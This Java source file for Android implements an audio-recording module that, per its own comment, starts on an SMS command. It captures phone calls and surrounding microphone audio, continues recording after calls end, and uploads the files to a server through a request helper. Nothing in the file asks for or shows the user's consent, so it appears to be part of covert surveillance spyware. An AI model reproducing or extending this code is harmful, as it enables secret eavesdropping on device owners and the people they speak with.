package com.inet.android.audio;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.media.MediaRecorder;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Log;

/**
 * RecordAudio class is designed to record audio after command
 * smsBroadcastReceiver
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudio {

	private static MediaRecorder mMediaRecorder;
	private static String time;
	private static final String mPathName = "data";

	// Thread pool
	private static ExecutorService mThreadPool = Executors.newCachedThreadPool();;
	public static AtomicBoolean mRecording = new AtomicBoolean(false);
	private static String outputFileName;
	private static String LOG_TAG = RecordAudio.class.getSimpleName().toString();

	private static int minute = -1; // in minute
	private static int seconds = -1;
	private static int duration = -1; // in second
	private static Context mContext;
	private static SharedPreferences sp;

	private static int currentCounter = 0;

	private final static Object lock = new Object();

	private static int recState = 0; // 0 - no rec; 1 - env rec; 2 - call rec; 3
										// - call env rec

	// 1
	public static void startEnvRec(final int secs, final int source, final Context ctx) {
		Log.d(LOG_TAG, "startEnvRec. recState = " + recState);
		recState = 1;
		Log.d(LOG_TAG, "1 recState = " + recState);
		// minute = min;
		// start(min, source, ctx);
		seconds = secs;
		start(secs, source, ctx);
		Log.d(LOG_TAG, "EnvRec started");
	}

	// 2
	public static void startCallRec(final int secs, final int source, final Context ctx) {
		Log.d(LOG_TAG, "startCallRec. recState = " + recState);
		Log.d(LOG_TAG, "2.1 recState = " + recState);
		if (recState != 0) {
			stop();
		}
		Log.d(LOG_TAG, "2.2 recState = " + recState);
		recState = 2;
		// start(minute, source, ctx);
		start(secs, source, ctx);
		Log.d(LOG_TAG, "CallRec started");
	}

	// 3
	private static void startCallEnvRec(final int secs, final int source, final Context ctx) {
		Log.d(LOG_TAG, "startCallEnvRec. recState = " + recState);
		recState = 3;
		Log.d(LOG_TAG, "3 recState = " + recState);
		// start(minute, source, ctx);
		start(secs, source, ctx);
		Log.d(LOG_TAG, "CallEnvRec started");
	}

	private static void stopEnvRec() {
		Log.d(LOG_TAG, "stopEnvRec");

		sp = PreferenceManager.getDefaultSharedPreferences(mContext);

		Editor ed = sp.edit();
		// Log.d(LOG_TAG, "duration = " + duration + ", minute = " + minute);
		// if ((minute - duration) > 0) {
		// ed.putInt("duration", minute - duration);
		// } else {
		// ed.putInt("duration", 0);
		// }

		Log.d(LOG_TAG, "duration = " + duration + ", seconds = " + seconds);
		if ((seconds - duration) > 0) {
			ed.putInt("duration", seconds - duration);
		} else {
			ed.putInt("duration", 0);
		}

		ed.putInt("souce_record", 0);
		ed.commit();

		// executeStopRecording();
		execStopRec();
		Log.d(LOG_TAG, "after executeStopRecording1");
	}

	private static void stopCallRec() {
		Log.d(LOG_TAG, "stopCallRec");
		// executeStopRecording();
		execStopRec();
		Log.d(LOG_TAG, "after executeStopRecording2");

		int minuteAfterCall = 1;
		minute = minuteAfterCall;
		seconds = minuteAfterCall * 60;
		Log.d(LOG_TAG, "recording is true, minute after: " + minuteAfterCall);

		if (minuteAfterCall == 0) {
			Log.d(LOG_TAG, "minuteAfterCall == 0");
			// RecordAudioV2.checkStateRecord(mContext);
			sp = PreferenceManager.getDefaultSharedPreferences(mContext);
			// minute = sp.getInt("duration", 0);
			seconds = sp.getInt("duration", 0);
			// Log.d(LOG_TAG, "duration1 = " + minute);
			Log.d(LOG_TAG, "duration1 = " + seconds);
			// startEnvRec(minute, MediaRecorder.AudioSource.MIC, mContext);
			startEnvRec(seconds, MediaRecorder.AudioSource.MIC, mContext);
		} else {
			// RecordAudioV2.executeRecording(minuteAfterCall,
			// MediaRecorder.AudioSource.MIC, mContext);
			// startCallEnvRec(minuteAfterCall, MediaRecorder.AudioSource.MIC,
			// mContext);
			startCallEnvRec(minuteAfterCall * 60, MediaRecorder.AudioSource.MIC, mContext);
		}
	}

	private static void stopCallEnvRec() {
		Log.d(LOG_TAG, "stopCallEnvRec");
		execStopRec();
		Log.d(LOG_TAG, "after executeStopRecording3");
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		// minute = sp.getInt("duration", 0);
		seconds = sp.getInt("duration", 0);
		// Log.d(LOG_TAG, "duration2 = " + minute);
		Log.d(LOG_TAG, "duration2 = " + seconds);
		// if (minute > 0) {
		// startEnvRec(minute, MediaRecorder.AudioSource.MIC, mContext);
		// }
		if (seconds > 0) {
			startEnvRec(seconds, MediaRecorder.AudioSource.MIC, mContext);
		}
	}

	public static void start(final int secs, final int source, final Context ctx) {
		Log.d(LOG_TAG, "start");

		// synchronized (lock) {
		mContext = ctx;
		// executeRecording(minute, source, ctx);
		// execRec(minute, source, ctx);
		execRec(secs, source, ctx);
		// }
	}

	public static void stop() {
		currentCounter = 0;
		Log.d(LOG_TAG, "stop. recState = " + recState);

		// synchronized (lock) {
		switch (recState) {
		case 0:
			Log.d(LOG_TAG, "case 0. recState = " + recState);
			break;
		case 1:
			Log.d(LOG_TAG, "case 1. recState = " + recState);
			recState = 0;
			stopEnvRec();
			break;
		case 2:
			Log.d(LOG_TAG, "case 2. recState = " + recState);
			recState = 0;
			stopCallRec();
			break;
		case 3:
			Log.d(LOG_TAG, "case 3. recState = " + recState);
			recState = 0;
			stopCallEnvRec();
			break;
		default:
			Log.d(LOG_TAG, "case default. recState = " + recState);
			recState = 0;
			break;
		}
		// }
		Log.d(LOG_TAG, "after stop cases. recState = " + recState);
	}

	/**
	 * Make audio recording without threadpool.
	 * 
	 * @param minute
	 *            total time of the record
	 * @param source
	 *            source of recording
	 * @param ctx
	 */
	private static void execRec(final int secs, final int source, final Context ctx) {
		outputFileName = getOutputFileName();
		if (outputFileName != null) {
			Log.d(LOG_TAG, "execRec");

			// startRecording(minute, source, outputFileName);
			if (getRecorder(secs, source, outputFileName) != null) {
				Log.d(LOG_TAG, "execRec getRecord != null");
			} else {
				Log.d(LOG_TAG, "execRec getRecord == null");
				return;
			}

			// launch the counter
			Log.d(LOG_TAG, "execRec mThreadPool.execute");
			// Log.d(LOG_TAG, "execRec minute = " + minute);
			Log.d(LOG_TAG, "execRec minute = " + secs);
			mThreadPool.execute(new RecordingCounterUpdater());
		}
	}

	/**
	 * Make stopping audio recording without threadpool.
	 * 
	 * @param minute
	 * @param source
	 * @param ctx
	 */
	private static void execStopRec() {
		if (mMediaRecorder != null) {
			Log.d(LOG_TAG, "execStopRec");
			stopRecording();

			mThreadPool.execute(new Runnable() {
				@Override
				public void run() {
					Log.d(LOG_TAG, "run send");
					if (outputFileName != null)
						sendAudio(outputFileName);
					outputFileName = null;
				}
			});
		}
	}

	/**
	 * ][zwid
	 * 
	 * @param min
	 * @param source
	 * @param fileName
	 * @return
	 */
	private static MediaRecorder getRecorder(int secs, int source, String fileName) {
		// if (min != -1) {
		// minute = min * SECONDS_PER_MINUTE;
		Log.d(LOG_TAG, "getRecorder minute = " + secs);
		// }

		if (secs == -1) {
			seconds = -1;
		}

		// minute = min;
		// if (mMediaRecorder == null) {
		Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
		Log.d(LOG_TAG, "source = " + source + ", seconds = " + secs);

		mMediaRecorder = new MediaRecorder();

		Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);

		switch (source) {
		case 1:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			break;
		case 2:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
			break;
		case 3:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
			break;
		case 4:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
			break;
		case 5:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
			break;
		case 6:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
			break;
		default:
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
			break;
		}

		mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		mMediaRecorder.setOutputFile(fileName);
		mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
		mMediaRecorder.setAudioEncodingBitRate(16);
		mMediaRecorder.setAudioSamplingRate(44100);
		mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
		// } else {
		// Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
		//
		// mMediaRecorder.stop();
		// mMediaRecorder.reset();
		// mMediaRecorder.release();
		// mMediaRecorder = null;
		// return null;
		// }

		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();

			Log.d(LOG_TAG, "mMediaRecorder.start()");
		} catch (IllegalStateException e) {
			Log.d(LOG_TAG, "IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			// mMediaRecorder.stop();
			// mMediaRecorder.reset();
			// mMediaRecorder.release();
			mMediaRecorder = null;
			stop();
		} catch (IOException e) {
			Log.d(LOG_TAG, "IOException thrown while trying to record a greeting");
			e.printStackTrace();
			// mMediaRecorder.stop();
			// mMediaRecorder.reset();
			// mMediaRecorder.release();
			mMediaRecorder = null;
			stop();
		} catch (RuntimeException e) {
			e.printStackTrace();
			if (source != 0) {
				Log.d(LOG_TAG, "Runtimeexception. Switch to the source 0");
				mMediaRecorder.reset();
				getRecorder(seconds, MediaRecorder.AudioSource.DEFAULT, fileName);
			} else {
				Log.d(LOG_TAG, "Runtimeexception. Source = 0. Return null.");
				// mRecording.set(false);
				return null;
			}
		}
		mRecording.set(true);
		Log.d(LOG_TAG, "mRecording = " + mRecording.get());
		return mMediaRecorder;
	}

	private static void stopRecording() {
		if (mMediaRecorder != null) {
			Log.d(LOG_TAG, "Stopping recording");
			mMediaRecorder.stop();
			// mMediaRecorder.reset();
			// mMediaRecorder.release();
			// mMediaRecorder = null;
			// mRecording.set(false);
			// Logging.doLog(LOG_TAG, "stopRecording mRecording = " +
			// mRecording.get(),
			// "stopRecording mRecording = " + mRecording.get());
		}
	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private static String getOutputFileName() {
		// create media file
		String dir = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = ConvertDate.logTime();
		String file = dir + "/" + time + ".mp4";

		Log.d(LOG_TAG, "file " + file);

		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Log.d(LOG_TAG, "Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private static class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			currentCounter = 0;
			synchronized (lock) {
				Log.d(LOG_TAG, "1 counterUpdater recState = " + recState + " seconds = " + seconds);
				while (recState != 0) {
					if (seconds != -1)
						postCounterUpdateMessage(currentCounter / 10);
					try {
						Thread.sleep(100);
					} catch (InterruptedException e) {
						// Re-assert the thread's interrupted status
						Thread.currentThread().interrupt();
						return;
					}
					currentCounter++;
					duration = currentCounter / 10; // record duration in
													// seconds
					Log.d(LOG_TAG, String.format("posting counter update of:%d", currentCounter));
				}
				Log.d(LOG_TAG, "2 counterUpdater recState = " + recState);
			}
		}
	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private static void postCounterUpdateMessage(int currentPosition) {

		// if (currentPosition == (minute * 60)) {
		if (currentPosition == (seconds)) {
			Log.d(LOG_TAG, "equals = " + seconds);
			stop();
			// executeStopRecording();
		}
	}

	private static void sendAudio(String path) {
		Log.d(LOG_TAG, "sendAudio duration " + duration + " sec.");
		Map<String, Object> file = new HashMap<String, Object>();
		Map<String, Object> payloadMap = new HashMap<String, Object>();

		file.put("type", AppConstants.TYPE_AUDIO_REQUEST);
		file.put("time", ConvertDate.logTime());
		file.put("path", path);
		file.put("duration", duration);
		payloadMap.put("file", path);
		RequestList.sendDataRequest(file, payloadMap, mContext);

	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	private static class RecorderErrorListener implements android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;
			}
			Log.d(LOG_TAG, String.format("MediaRecorder error occured: %s,%d", whatDescription, extra));
		}
	}

}